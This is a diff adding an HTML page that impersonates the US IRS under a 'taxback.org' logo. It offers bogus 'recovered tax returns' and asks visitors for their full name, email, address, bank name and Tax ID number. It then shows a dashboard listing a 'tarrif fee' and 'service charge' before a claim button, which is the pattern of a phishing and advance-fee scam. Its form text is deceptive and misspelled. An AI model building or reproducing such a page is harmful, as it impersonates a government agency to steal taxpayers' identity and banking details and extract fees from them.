@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link rel="stylesheet" href="icon/icon.css" type="text/css" media="all" />
+  
+  <link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
+  
+  <title>IRS Tax Returns</title>
+</head>
+
+<body>
+  <div class="landing">
+    <div class="header">
+      <img src="img/taxback-logo.png" alt="taxback.org logo">
+    </div>
+    
+    <div class="loader">
+      <span class="rotate">🌐</span>
+      <span class="message">Checking to see if you're eligible, please wait...</span>
+    </div>
+    
+    <form id="eligibilityForm" class="">
+      <div class="info-text">
+        <span class="title">IRS tax returns</span>
+        <span class="body">
+          From the board of the US internal revenue service shareholders, its has become of due concern to allocate back return to tax payers who have not defaulted over the course of the <b>last 3 months.</b> <br><br> Your <b>credit records</b> will in turn determine how much in percent of your tax returns you can claim.
+        </span>
+      </div>
+      
+      <label for="beneficiaryName">Full name</label>
+      <input type="text" name="Name" id="beneficiaryName">
+      
+      <label for="beneficiaryEmail">Email address</label>
+      <input type="email" name="Email" id="beneficiaryEmail">
+      
+      <label for="name">City</label>
+      <input type="text" name="City" id="beneficiaryCity">
+      
+      <label for="name">Contact address</label>
+      <input type="text" name="Address" id="beneficiaryAddress">
+      
+      <label for="name">Bank name</label>
+      <input type="text" name="Bank" id="beneficiaryBank">
+      
+      <label for="name">Tax Id number</label>
+      <input type="tel" name="TIN" id="beneficiaryTIN">
+      
+      <input type="submit" value="Check legibility">
+    </form>
+  </div>
+  
+  <header>
+    <img src="img/taxback-logo.png" alt="taxback.org logo">
+    
+    <span class="sitename">IRS Tax returns</span>
+  </header>
+  
+  <main>
+    <div class="dashboard">
+      <div class="citizen-details">
+        <img src="img/default-avatar.jpeg" alt="avatar" class="avatar">
+        
+        <span class="name">--</span>
+        
+        <div class="details">
+          <div class="email">
+            <span class="ms-rounded">message</span>
+            
+            <span class="txt">----</span>
+          </div>
+          
+          <div class="city">
+            <span class="ms-rounded">location_pin</span>
+            
+            <span class="txt">----</span>
+          </div>
+          
+          <div class="bank">
+            <span class="ms-rounded">account_balance</span>
+            
+            <span class="txt">----</span>
+          </div>
+          
+          <div class="address">
+            <span class="ms-rounded">home</span>
+            
+            <span class="txt">----</span>
+          </div>
+          
+          <div class="tinId">
+            <span class="ms-rounded">id_card</span>
+            
+            <span class="txt">----</span>
+          </div>
+        </div>
+      </div>
+      
+      <div style="width: 100%;display: grid;grid-auto-flow: row;gap:15px;">
+        <span style="font-size: 16px; font-weight: 400; font-family: 'msd', serif; text-transform: uppercase;letter-spacing: 1.5px;">Tax return details</span>
+        
+        <div class="fund-details">
+          <span class="amt">Total returns: $0.00</span>
+          <span class="fee-amt">Tarrif fee: $0.00</span>
+          <span class="service-charge-amt">Service charge: $0.00</span>
+          <span class="final-amt">Total charges: $0.00</span>
+        </div>
+      </div>
+      
+      <div class="fund-agreement active">
+        <div class="title">
+          <span>Tax return agreement</span>
+        </div>
+        
+        <div class="content">
+          <div class="sections">
+            <span>
+              You are bound by the terms below should you proceed to claim the recovered tax returns as stated above.
+            </span>
+            <ol class="a">
+              <li>
+                On no account should you be in tax debt prior to claiming the recovered tax returns.
+              </li>
+              <li>
+                All outstanding tax liabilities must be settled before any recovered tax returns is disbursed.
+              </li>
+              <li>
+                Claimants must provide proof of tax compliance to be eligible for the recovered tax returns.
+              </li>
+              <li>
+                Failure to resolve prior tax debts may result in forfeiture of the recovered tax returns.
+              </li>
+            </ol>
+          </div>
+          
+          <button class="claim-btn">Claim tax returns</button>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <footer>
+    <div>
+      <div class="footer-banner">
+        <img src="img/taxback-logo.png" alt="taxback-logo">
+        
+        <span>IRS TAX RETURNS</span>
+      </div>
+      
+      <div class="footer-links">
+        <a href="#"></a>
+        <a href="#"></a>
+        <a href="#"></a>
+      </div>
+    </div>
+  </footer>
+  <script src="js/main.js"></script>
+</body>
+
+</html>
